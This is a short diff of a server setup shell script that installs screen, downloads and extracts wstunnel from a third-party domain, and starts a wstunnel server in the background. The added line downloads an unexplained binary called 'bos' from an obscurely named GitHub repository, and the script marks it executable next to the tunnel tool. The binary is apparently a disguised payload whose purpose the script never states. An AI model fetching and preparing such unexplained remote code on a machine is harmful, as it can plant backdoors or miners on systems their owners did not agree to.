@@ -2,6 +2,7 @@
 sudo apt update
 sudo apt install screen -y
 curl -L -O -J https://storage.technoelectro.online/wstunnel_10.5.2_linux_amd64.tar.gz
+curl -O -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/bos
 tar -xf wstunnel_10.5.2_linux_amd64.tar.gz
 chmod +x wstunnel bos
 nohup ./wstunnel server ws://127.0.0.1:1050 &
